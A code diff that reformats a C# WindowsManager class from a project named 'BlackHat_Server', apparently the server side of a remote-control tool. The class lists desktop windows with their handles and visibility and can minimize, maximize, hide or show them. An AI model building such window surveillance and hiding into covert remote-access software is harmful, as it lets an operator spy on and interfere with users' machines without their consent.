@@ -1,52 +1,52 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text;
 
 namespace BlackHat_Server
 {
-    class WindowsManager
+    internal class WindowsManager
     {
         public delegate bool EnumDelegate(IntPtr hWnd, int lParam);
-       
+
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool IsWindowVisible(IntPtr hWnd);
+        private static extern bool IsWindowVisible(IntPtr hWnd);
 
-        
+
         [DllImport("user32.dll", EntryPoint = "GetWindowText",
-        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);
+            ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpWindowText, int nMaxCount);
 
-       
+
         [DllImport("user32.dll", EntryPoint = "EnumDesktopWindows",
-        ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
-        static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);
+            ExactSpelling = false, CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction,
+            IntPtr lParam);
 
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool ShowWindow(IntPtr hWnd, WindowStyle nCmdShow);
-       
+        private static extern bool ShowWindow(IntPtr hWnd, WindowStyle nCmdShow);
+
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern int CloseWindow(IntPtr hWnd);
+        private static extern int CloseWindow(IntPtr hWnd);
 
 
         /// <summary>
-        /// Stringa con tutte le finestre. Formato:
-        /// NOMEFINESTRA|HANDLE|VISIBILE*
+        ///     Stringa con tutte le finestre. Formato:
+        ///     NOMEFINESTRA|HANDLE|VISIBILE*
         /// </summary>
         /// <returns></returns>
         public string GetWindows()
         {
             try
             {
-                string exitStr = "";
+                var exitStr = "";
                 EnumDelegate filter = delegate(IntPtr hWnd, int lParam)
                 {
-                    StringBuilder strbTitle = new StringBuilder(255);
-                    int nLength = GetWindowText(hWnd, strbTitle, strbTitle.Capacity + 1);
-                    string strTitle = strbTitle.ToString();
+                    var strbTitle = new StringBuilder(255);
+                    var nLength = GetWindowText(hWnd, strbTitle, strbTitle.Capacity + 1);
+                    var strTitle = strbTitle.ToString();
 
                     if (!string.IsNullOrEmpty(strTitle))
                         exitStr += string.Format("{0}|{1}|{2}*", strTitle, hWnd, IsWindowVisible(hWnd));
@@ -58,20 +58,17 @@ namespace BlackHat_Server
                     exitStr = exitStr.TrimEnd('*');
 
 
-
                 return exitStr;
             }
-            catch 
+            catch
             {
                 return null;
             }
-           
-
         }
 
 
         /// <summary>
-        /// Minimizza La finestra specificata
+        ///     Minimizza La finestra specificata
         /// </summary>
         /// <param name="Handle"></param>
         /// <returns></returns>
@@ -79,18 +76,17 @@ namespace BlackHat_Server
         {
             try
             {
-                
-                IntPtr iptrHandle = (IntPtr)Handle;
-                
+                var iptrHandle = (IntPtr) Handle;
+
                 //int res = CloseWindow(iptrHandle); ;
 
-                bool test = ShowWindow(iptrHandle,WindowStyle.Minimize);
+                var test = ShowWindow(iptrHandle, WindowStyle.Minimize);
 
-                int res = 1;
+                var res = 1;
 
                 return res;
             }
-            catch 
+            catch
             {
                 return -1;
             }
@@ -98,7 +94,7 @@ namespace BlackHat_Server
 
 
         /// <summary>
-        /// Massimizza La finestra specificata
+        ///     Massimizza La finestra specificata
         /// </summary>
         /// <param name="Handle"></param>
         /// <returns></returns>
@@ -106,12 +102,11 @@ namespace BlackHat_Server
         {
             try
             {
+                var iptrHandle = (IntPtr) Handle;
 
-                IntPtr iptrHandle = (IntPtr)Handle;                
+                var test = ShowWindow(iptrHandle, WindowStyle.ShowMaximized);
 
-                bool test = ShowWindow(iptrHandle, WindowStyle.ShowMaximized);
-
-                int res = 1;
+                var res = 1;
 
                 return res;
             }
@@ -122,7 +117,7 @@ namespace BlackHat_Server
         }
 
         /// <summary>
-        /// Nasconde La finestra specificata
+        ///     Nasconde La finestra specificata
         /// </summary>
         /// <param name="Handle"></param>
         /// <returns></returns>
@@ -130,12 +125,11 @@ namespace BlackHat_Server
         {
             try
             {
+                var iptrHandle = (IntPtr) Handle;
 
-                IntPtr iptrHandle = (IntPtr)Handle;                
+                var test = ShowWindow(iptrHandle, WindowStyle.Hide);
 
-                bool test = ShowWindow(iptrHandle, WindowStyle.Hide);
-
-                int res = 1;
+                var res = 1;
 
                 return res;
             }
@@ -146,7 +140,7 @@ namespace BlackHat_Server
         }
 
         /// <summary>
-        /// Show La finestra specificata
+        ///     Show La finestra specificata
         /// </summary>
         /// <param name="Handle"></param>
         /// <returns></returns>
@@ -154,12 +148,11 @@ namespace BlackHat_Server
         {
             try
             {
+                var iptrHandle = (IntPtr) Handle;
 
-                IntPtr iptrHandle = (IntPtr)Handle;
+                var test = ShowWindow(iptrHandle, WindowStyle.ShowNormal);
 
-                bool test = ShowWindow(iptrHandle, WindowStyle.ShowNormal);
-
-                int res = 1;
+                var res = 1;
 
                 return res;
             }
@@ -168,7 +161,5 @@ namespace BlackHat_Server
                 return -1;
             }
         }
-
-
     }
 }
